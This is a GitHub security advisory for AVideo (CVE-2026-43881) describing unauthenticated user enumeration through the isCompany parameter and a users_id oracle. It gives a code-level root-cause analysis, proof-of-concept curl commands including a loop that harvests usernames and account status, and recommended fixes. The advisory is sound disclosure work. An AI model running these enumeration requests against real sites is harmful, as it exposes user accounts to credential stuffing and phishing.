# [M] AVideo: Unauthenticated User Enumeration in objects/users.json.php via isCompany Parameter Allows Bypass of the Admin-Only Listing Restriction

## Summary
Severity: Medium
Advisory: GHSA-6rvw-7p8v-mjfq
CVE: CVE-2026-43881
CWE: CWE-306
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-6rvw-7p8v-mjfq
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

`objects/users.json.php` exposes two unauthenticated paths that disclose the full set of registered user accounts. The `isCompany` request parameter causes the handler to set `$ignoreAdmin = true` for any non-admin caller (including unauthenticated visitors), which defeats the admin-only guard inside `User::getAllUsers()`/`User::getTotalUsers()`. A second path accepts `users_id` and calls `User::getUserFromID()` directly with no permission check, producing a single-user oracle. Both paths return `id`, `identification` (display name), channel URL, `photo`, `background`, and `status`, plus the total account count.

## Details

### Root cause #1 — `isCompany` admin bypass

`objects/users.json.php:13-53` (HEAD, v29.0):

```php
$canAdminUsers = canAdminUsers();                                    // line 13 — for output filtering only
...
if (!empty($_REQUEST['users_id'])) {
    $user = User::getUserFromID($_REQUEST['users_id']);              // path #2
    ...
} else if (empty($_REQUEST['user_groups_id'])) {
    $isAdmin     = null;
    $isCompany   = null;
    $ignoreAdmin = canSearchUsers() ? true : false;
    ...
    if (isset($_REQUEST['isCompany'])) {                              // line 39
        $isCompany = intval($_REQUEST['isCompany']);
        if (!$canAdminUsers) {
            if (User::isACompany()) { $isCompany = 0; }
            else                    { $isCompany = 1; }
            $ignoreAdmin = true;                                      // line 47 — bypass flag
        }
    }
    ...
    $users = User::getAllUsers($ignoreAdmin, [...], @$_GET['status'], $isAdmin, $isCompany);
    $total = User::getTotalUsers($ignoreAdmin, @$_GET['status'], $isAdmin, $isCompany);
}
```

`User::isACompany()` with no argument (`objects/user.php:1629-1646`) returns `!empty($_SESSION['user']['is_company'])`, which is `false` for unauthenticated visitors. So the anonymous-attacker branch takes the `else` arm: `$isCompany = 1; $ignoreAdmin = true;`.

The admin-only guards in `User::getAllUsers()` (`objects/user.php:2315-2321`) and `User::getTotalUsers()` (`objects/user.php:2480-2484`) are now short-circuited:

```php
public static function getAllUsers($ignoreAdmin = false, ...) {
    if (!Permissions::canAdminUsers() && !$ignoreAdmin) {   // $ignoreAdmin === true → guard skipped
        _error_log('You are not admin and cannot list all users');
        return false;
    }
    ...
    $sql = "SELECT * FROM users u WHERE 1=1 ...";
    if (isset($isCompany)) {
        if (!empty($isCompany) && $isCompany == self::$is_company_status_ISACOMPANY || ...) {
            $sql .= " AND is_company = $isCompany ";
        } else {
            $sql .= " AND (is_company = 0 OR is_company IS NULL) ";
        }
    }
```

Note: when the attacker supplies `isCompany=0`, the `else` branch is taken because of PHP's operator precedence (`!empty($isCompany) && ...` short-circuits to false), and the SQL filter becomes `is_company = 0 OR is_company IS NULL` — i.e. **every non-company user**. Combined with the bypass, this returns the entire user table in chunks controlled by the attacker-supplied `rowCount`.

### Root cause #2 — `users_id` single-record oracle

`objects/users.json.php:20-29` calls `User::getUserFromID($_REQUEST['users_id'])` with no auth check. `User::getUserFromID()` (`objects/user.php:2028-2075`) queries `SELECT * FROM users WHERE id = ?` and returns `id`, `identification`, `photo`, `background`, `status`, `channelName`, `about`, `tags`, with only `password`/`recoverPass`/PII stripped for non-admins. The handler then wraps this in the standard BootGrid envelope with `total = 1` when the user exists and `total = 0` otherwise — a perfect sequential-ID existence oracle.

### Why there is no blocking mitigation

- No router-level auth: the `.htaccess` rewrite (`.htaccess:317`) maps `/users.json` directly to this file.
- No CSRF/origin gate: the file is explicitly listed in `objects/functionsSecurity.php:893` under “Read-only endpoints that accept POST params”, meaning the same-origin/CSRF middleware is skipped by design.
- The output-filter block (`objects/users.json.php:66-77`) only limits **which** fields are echoed — it does not suppress existence or display-name leakage, and `total` is always echoed on line 97.
- `rowCount` is attacker-controlled with no upper bound (line 17-18 only sets a default of 10).

## PoC

Target: a default AVideo 29.0 install at `http://target/`. No session cookie, no CSRF token, no API key required.

### Path 1 — bulk listing via `isCompany` admin-check bypass

```
$ curl -s 'http://target/objects/users.json.php?isCompany=0&rowCount=1000&current=1'
{"current":1,"rowCount":1000,"total":42,"rows":[
  {"id":"1","identification":"admin","photo":"https://target/videos/userPhoto/photo1.png",
   "background":"https://target/...","status":"a","creator":"<div ...channel URL...>"},
  {"id":"2","identification":"alice",...,"status":"a",...},
  ...
]}
```

The same call with `isCompany=1` returns the subset of company-flagged users; `isCompany=0` returns all non-company users. Both branches set `$ignoreAdmin = true`.

### Path 2 — sequential-ID existence / display-name oracle

```
$ for i in $(seq 1 10000); do
    curl -s "http://target/objects/users.json.php?users_id=$i" \
      | jq -r '[.total, .rows[0].id, .rows[0].identification, .rows[0].status] | @tsv'
  done
1	1	admin	a
1	2	alice	a
0	null	null	null
1	4	bob	i
...
```

`total=1` → ID exists; `identification` field leaks the login/display name; `status` reveals active (`a`) vs inactive (`i`).

### Verification of the branch logic

```php
// Reproduces objects/users.json.php:39-48 for an unauthenticated attacker.
$canAdminUsers = false; $ignoreAdmin = false;
$_SESSION = [];                      // unauthenticated
$_REQUEST = ['isCompany' => '1'];
if (isset($_REQUEST['isCompany'])) {
    $isCompany = intval($_REQUEST['isCompany']);
    if (!$canAdminUsers) {
        $isACompany = !empty($_SESSION['user']['is_company']);   // false
        $isCompany   = $isACompany ? 0 : 1;
        $ignoreAdmin = true;
    }
}
var_dump($isCompany, $ignoreAdmin);  // int(1) bool(true)  → admin guard SKIPPED
```

## Impact

An unauthenticated remote attacker can:

- Enumerate every user account on the platform (display names, numeric IDs, channel URLs/usernames, active/inactive status, profile photo/background URLs).
- Obtain the total registered-user count, useful for platform sizing and post-compromise reporting.
- Build a targeted username list for credential stuffing, password spraying, or phishing against AVideo’s login/password-recovery endpoints.
- Cross-reference leaked display names against the known password-recovery oracle to identify valid targets.

No auth is required, the request is a single unauthenticated `GET`, and `rowCount` is unbounded, so the full user list can be harvested in one request.

## Recommended Fix

1. Require authentication at the top of `objects/users.json.php`, and gate the bulk-listing path to users who legitimately need to search:

    ```php
    require_once $global['systemRootPath'] . 'objects/user.php';
    User::loginCheck();                         // reject anonymous callers
    if (!canSearchUsers()) {
        header('HTTP/1.1 403 Forbidden');
        die('{"error":"forbidden"}');
    }
    ```

2. Remove the `isCompany`-driven `$ignoreAdmin = true` branch (users.json.php:41-48). It served no purpose that the explicit `canSearchUsers()` check above does not already cover, and its only observable effect is the bypass described here.

3. Gate the `users_id` path behind the same check, or restrict its output to the caller’s own record when the caller is not an admin:

    ```php
    if (!empty($_REQUEST['users_id'])) {
        $requestedId = intval($_REQUEST['users_id']);
        if (!canSearchUsers() && $requestedId !== User::getId()) {
            header('HTTP/1.1 403 Forbidden');
            die('{"error":"forbidden"}');
        }
        $user = User::getUserFromID($requestedId);
        ...
    }
    ```

4. Consider clamping `$_REQUEST['rowCount']` to a sane ceiling (e.g. 100) and removing `objects/users.json.php` from the CSRF-bypass list in `objects/functionsSecurity.php:893` unless there is a specific mobile-client requirement — and if there is, route it through an authenticated API token instead of making the endpoint anonymously reachable.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-6rvw-7p8v-mjfq
- https://nvd.nist.gov/vuln/detail/CVE-2026-43881
- https://github.com/WWBN/AVideo/commit/d9cdc702481a626b15f814f6093f1e2a9c20d375
- https://github.com/WWBN/AVideo
